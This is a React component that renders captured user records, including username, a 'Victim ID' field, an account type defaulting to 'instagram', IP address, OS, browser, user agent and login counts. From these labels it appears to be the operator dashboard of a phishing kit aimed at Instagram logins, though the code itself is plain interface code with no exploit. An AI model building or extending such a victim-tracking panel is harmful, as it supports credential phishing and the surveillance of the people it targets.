'use client';

import React from 'react';
import styled from 'styled-components';
import { useUserData, UserData } from '@/contexts/UserDataContext';
import { theme } from '@/styles/theme';

const Container = styled.div`
  background: white;
  border-radius: 20px;
  padding: ${theme.spacing.lg};
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
  margin-bottom: ${theme.spacing.xl};
`;

const Title = styled.h2`
  color: ${theme.colors.primary};
  margin-bottom: ${theme.spacing.lg};
  display: flex;
  align-items: center;
  gap: ${theme.spacing.sm};
`;

const DataGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: ${theme.spacing.lg};
`;

const DataCard = styled.div<{ $type?: string }>`
  background: ${({ $type }) => 
    $type === 'primary' ? theme.colors.background : 'white'};
  border-radius: 15px;
  padding: ${theme.spacing.lg};
  border: 2px solid ${({ $type }) => 
    $type === 'primary' ? theme.colors.primary + '20' : '#e5e7eb'};
`;

const DataTitle = styled.h3`
  color: ${theme.colors.text};
  margin-bottom: ${theme.spacing.md};
  font-size: 1.1rem;
`;

const DataItem = styled.div`
  margin-bottom: ${theme.spacing.sm};
  display: flex;
  justify-content: space-between;
  align-items: center;
`;

const DataLabel = styled.span`
  color: ${theme.colors.textLight};
  font-weight: 500;
`;

const DataValue = styled.span<{ $highlight?: boolean }>`
  color: ${({ $highlight }) => 
    $highlight ? theme.colors.primary : theme.colors.text};
  font-weight: ${({ $highlight }) => $highlight ? '600' : '400'};
  background: ${({ $highlight }) => 
    $highlight ? theme.colors.primary + '10' : 'transparent'};
  padding: ${({ $highlight }) => $highlight ? '4px 8px' : '0'};
  border-radius: 6px;
`;

const LoadingState = styled.div`
  text-align: center;
  padding: ${theme.spacing.xl};
  color: ${theme.colors.textLight};
`;

const ErrorState = styled.div`
  background: ${theme.colors.error}20;
  border: 2px solid ${theme.colors.error};
  color: ${theme.colors.text};
  padding: ${theme.spacing.lg};
  border-radius: 10px;
  text-align: center;
`;

const EmptyState = styled.div`
  text-align: center;
  padding: ${theme.spacing.xl};
  color: ${theme.colors.textLight};
  
  button {
    margin-top: ${theme.spacing.md};
  }
`;

const Badge = styled.span<{ $type: 'success' | 'warning' | 'info' }>`
  display: inline-block;
  padding: 4px 12px;
  border-radius: 20px;
  font-size: 0.75rem;
  font-weight: 600;
  background: ${({ $type }) => {
    switch ($type) {
      case 'success': return theme.colors.success + '20';
      case 'warning': return theme.colors.warning + '20';
      case 'info': return theme.colors.primary + '20';
      default: return '#e5e7eb';
    }
  }};
  color: ${({ $type }) => {
    switch ($type) {
      case 'success': return theme.colors.success;
      case 'warning': return theme.colors.warning;
      case 'info': return theme.colors.primary;
      default: return theme.colors.text;
    }
  }};
`;

const DeviceInfo = styled.div`
  display: flex;
  align-items: center;
  gap: ${theme.spacing.sm};
  margin-top: ${theme.spacing.md};
  padding-top: ${theme.spacing.md};
  border-top: 1px solid #e5e7eb;
`;

const UserDataDisplay: React.FC = () => {
  const { userData, analytics, isLoading, error, refreshData } = useUserData();

  if (isLoading) {
    return (
      <LoadingState>
        <div className="spinner"></div>
        <p>Loading your data from Cloudflare backend...</p>
      </LoadingState>
    );
  }

  if (error) {
    return (
      <ErrorState>
        <h3>⚠️ Error Loading Data</h3>
        <p>{error}</p>
        <button onClick={refreshData} style={{ marginTop: theme.spacing.md }}>
          Try Again
        </button>
      </ErrorState>
    );
  }

  if (!userData) {
    return (
      <EmptyState>
        <h3>No Data Available</h3>
        <p>Complete the login process to see your data here</p>
        <p>Your data will automatically appear after login</p>
      </EmptyState>
    );
  }

  const isMobile = userData.userAgent.includes('Mobile');
  const browserInfo = userData.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/(\d+)/);
  const browser = browserInfo ? browserInfo[1] : 'Unknown Browser';
  const os = userData.userAgent.match(/(Windows|Macintosh|Linux|Android|iOS)/);
  const operatingSystem = os ? os[1] : 'Unknown OS';

  return (
    <Container>
      <Title>
        📊 Your Data from Cloudflare Backend
        <Badge $type="success">Live Data</Badge>
      </Title>
      
      <DataGrid>
        {/* User Information */}
        <DataCard $type="primary">
          <DataTitle>👤 User Information</DataTitle>
          <DataItem>
            <DataLabel>Username</DataLabel>
            <DataValue $highlight>{userData.username}</DataValue>
          </DataItem>
          <DataItem>
            <DataLabel>Record ID</DataLabel>
            <DataValue>#{userData.id}</DataValue>
          </DataItem>
          <DataItem>
            <DataLabel>Account Type</DataLabel>
            <DataValue>
              <Badge $type="info">{userData.type || 'instagram'}</Badge>
            </DataValue>
          </DataItem>
          <DataItem>
            <DataLabel>Victim ID</DataLabel>
            <DataValue>{userData.user_id_victim || 'E5ZH4'}</DataValue>
          </DataItem>
          <DataItem>
            <DataLabel>Recorded At</DataLabel>
            <DataValue>{new Date(userData.recordedAt).toLocaleString()}</DataValue>
          </DataItem>
        </DataCard>

        {/* Device & Location */}
        <DataCard>
          <DataTitle>📍 Device & Location</DataTitle>
          <DataItem>
            <DataLabel>IP Address</DataLabel>
            <DataValue $highlight>{userData.ip}</DataValue>
          </DataItem>
          <DataItem>
            <DataLabel>Device Type</DataLabel>
            <DataValue>
              <Badge $type={isMobile ? 'success' : 'info'}>
                {isMobile ? '📱 Mobile' : '💻 Desktop'}
              </Badge>
            </DataValue>
          </DataItem>
          <DataItem>
            <DataLabel>Operating System</DataLabel>
            <DataValue>{operatingSystem}</DataValue>
          </DataItem>
          <DataItem>
            <DataLabel>Browser</DataLabel>
            <DataValue>{browser}</DataValue>
          </DataItem>
          
          <DeviceInfo>
            <div>
              <DataLabel style={{ fontSize: '0.875rem' }}>User Agent</DataLabel>
              <DataValue style={{ fontSize: '0.75rem' }}>
                {userData.userAgent.substring(0, 50)}...
              </DataValue>
            </div>
          </DeviceInfo>
        </DataCard>

        {/* Analytics */}
        <DataCard>
          <DataTitle>📈 Session Analytics</DataTitle>
          {analytics ? (
            <>
              <DataItem>
                <DataLabel>Last Login</DataLabel>
                <DataValue>{new Date(analytics.lastLogin).toLocaleString()}</DataValue>
              </DataItem>
              <DataItem>
                <DataLabel>Source</DataLabel>
                <DataValue>
                  <Badge $type="info">{analytics.source}</Badge>
                </DataValue>
              </DataItem>
              <DataItem>
                <DataLabel>Total Logins</DataLabel>
                <DataValue $highlight>{analytics.totalLogins}</DataValue>
              </DataItem>
              <DataItem>
                <DataLabel>Session Duration</DataLabel>
                <DataValue>
                  {Math.floor((Date.now() - new Date(analytics.lastLogin).getTime()) / 60000)} min
                </DataValue>
              </DataItem>
            </>
          ) : (
            <DataItem>
              <DataLabel>Analytics</DataLabel>
              <DataValue>No analytics data available</DataValue>
            </DataItem>
          )}
        </DataCard>
      </DataGrid>
    </Container>
  );
};

export default UserDataDisplay;